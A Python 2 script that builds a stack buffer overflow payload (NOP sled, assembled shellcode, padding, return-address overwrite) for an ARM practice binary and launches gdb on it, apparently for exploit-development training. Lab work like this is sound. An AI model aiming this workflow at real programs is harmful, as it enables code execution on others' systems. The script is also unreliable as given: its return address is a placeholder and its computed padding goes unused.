#!/usr/bin/env python

from  subprocess import Popen, PIPE, call
import sys
import os

# prog shellcodeAsmFile overflowSize
# or
# prog clean


"""
Set your exploit/ debug variables here 
"""
# make sure your .gdbint has "run < sploit" in it
gdb	="/usr/bin/gdb"

# point this to the binary your are working with
app="/home/pi/repos/ARM-challenges/stack0"

fName 	= "shell"
exploit = "sploit"

# this is add r3, pc, #1, a arm instruction with no null chars we use as a nop
# maybe there is somthing better...
nop	= '\x01\x30\x8f\xe2'
nops	= nop * 8

# Set this to somewhere in the middle of your nops on the stack
pcPivot = ######

# If we need overflow set it here
# format is decimal in bytes
overflowPadding = 78

# Wrapper to run bash commands and print out
# errors/output
def runCmd(cmd):
	process = Popen(cmd, stdout=PIPE)
	output, error = process.communicate()
	if (output):
		print output
	if (error):
		print error

# check that there is some arg, we expect either the asm filename or clean
if (len(sys.argv) < 2):
	print "need asm filename or clean"
	sys.exit(-1)

# clean the old bins 
if (sys.argv[1] == "clean"):
	try:
		os.remove(fName)
		os.remove(fName + ".o")
		os.remove(fName + ".bin")
		os.remove(exploit)
	except Exception as e:
		print "failed to remove file or something: " + str(e)
	sys.exit(0)
elif (os.path.exists(sys.argv[1])):
	print "Using shellcode from {}...".format(sys.argv[1])
else:
	print "unknown cmd..."
	sys.exit(-1)

# assemble shellcode
runCmd(["as", sys.argv[1], "-o", fName + ".o"])

# link, -N needed for writable text section for null byte problem in string
runCmd(["ld", "-N", fName + ".o", "-o", fName ])

# extract text section
runCmd(["objcopy", "-O", "binary", fName, fName + ".bin"])

# get shellcode bytes, so we can add them to the full exploit
shellCode = ""
with open(fName + ".bin",'rb') as f:
	shellCode = f.read()

# calc/add overflow
overflow = ""
if (len(sys.argv) > 2 and sys.argv[2].isdigit()):
	overflowPadding = int(sys.argv[2])

overflowAdjusted =  overflowPadding - len(nops) - len(shellCode) - len(pcPivot)

print "{} nops len".format(len(nops))
print "{} shellcode len".format(len(shellCode))
print "{} pc overwrite len (this should always be 4)".format(len(pcPivot))
print "constructing exploit: nops + shellcode + A * {} + pcPivot".format(overflowAdjusted)
overflow = "A" * overflowPadding

with open(exploit, 'wb') as f:
	f.write(nops + shellCode + overflow + pcPivot )
	
# dump the sploit just as a quick visual check
cmd = ["hexdump", "-v", "-e", "8/4 \" %02X\" \"\n\"", exploit]
runCmd(cmd)

#run it
call( [gdb, app] )


